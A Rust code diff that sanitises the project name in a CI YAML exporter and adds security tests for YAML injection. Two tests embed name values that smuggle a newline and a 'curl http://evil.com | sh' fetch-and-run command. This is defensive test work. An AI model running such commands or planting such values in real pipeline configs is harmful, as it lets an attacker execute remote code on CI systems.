@@ -88,8 +88,16 @@ impl CiExporter {
         tera.add_raw_template("ci", template_src)
             .map_err(|e| CliError::ConfigValidation(format!("CI template parse error: {e}")))?;
 
+        // Sanitize name: only allow safe chars for YAML context
+        let safe_name: String = self
+            .config
+            .name
+            .chars()
+            .filter(|c| c.is_alphanumeric() || matches!(c, ' ' | '_' | '-' | '.'))
+            .collect();
+
         let mut ctx = Context::new();
-        ctx.insert("name", &self.config.name);
+        ctx.insert("name", &safe_name);
         ctx.insert("app_type", &self.config.app.app_type.to_string());
         ctx.insert("deploy_target", &self.config.deploy.target.to_string());
 
@@ -102,5 +110,81 @@ impl CiExporter {
 
         tera.render("ci", &ctx)
             .map_err(|e| CliError::ConfigValidation(format!("CI template render error: {e}")))
+    }
+}
+
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// Security tests
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::cli::config_parser::StackerConfig;
+
+    fn config_with_name(name: &str) -> StackerConfig {
+        let mut config = StackerConfig::default();
+        config.name = name.to_string();
+        config
+    }
+
+    // ── SECURITY: YAML injection via project name ─────────────────
+    // CWE-94: Improper Control of Generation of Code
+    //
+    // If a malicious stacker.yml sets `name` to a value containing YAML
+    // special characters or newlines, the generated CI pipeline could be
+    // manipulated to run arbitrary commands.
+
+    #[test]
+    fn test_github_yaml_injection_via_name_newline_is_sanitized() {
+        let config = config_with_name("legit\n        run: curl http://evil.com | sh");
+        let exporter = CiExporter::new(config);
+        let result = exporter.generate_github().unwrap();
+
+        assert!(
+            !result.contains("curl http://evil.com"),
+            "Injected content must be stripped from output. Got:\n{}",
+            result
+        );
+        // The sanitized name should still contain the safe part
+        assert!(result.contains("legit"));
+    }
+
+    #[test]
+    fn test_gitlab_template_uses_only_enum_deploy_target() {
+        // GitLab template only uses {{ deploy_target }} which comes from
+        // a Rust enum (DeployTarget) — so injection is not possible through
+        // the name field. This test verifies the template is safe.
+        let config = config_with_name("legit\n    - curl http://evil.com | sh");
+        let exporter = CiExporter::new(config);
+        let result = exporter.generate_gitlab().unwrap();
+
+        // The name is NOT used in the gitlab template, so it cannot be injected
+        assert!(!result.contains("evil.com"));
+        assert!(result.contains("--target"));
+    }
+
+    #[test]
+    fn test_github_yaml_injection_via_deploy_target() {
+        // deploy_target is derived from an enum so it's constrained,
+        // but we verify the template still renders safely with normal values
+        let config = config_with_name("safe-project");
+        let exporter = CiExporter::new(config);
+        let result = exporter.generate_github().unwrap();
+        assert!(result.contains("--target local"));
+        assert!(result.contains("Deploy safe-project"));
+    }
+
+    #[test]
+    fn test_normal_project_name_renders_correctly() {
+        let config = config_with_name("my-app");
+        let exporter = CiExporter::new(config);
+
+        let github = exporter.generate_github().unwrap();
+        assert!(github.contains("name: Deploy my-app with Stacker"));
+        assert!(github.contains("--target local"));
+
+        let gitlab = exporter.generate_gitlab().unwrap();
+        assert!(gitlab.contains("--target local"));
     }
 }
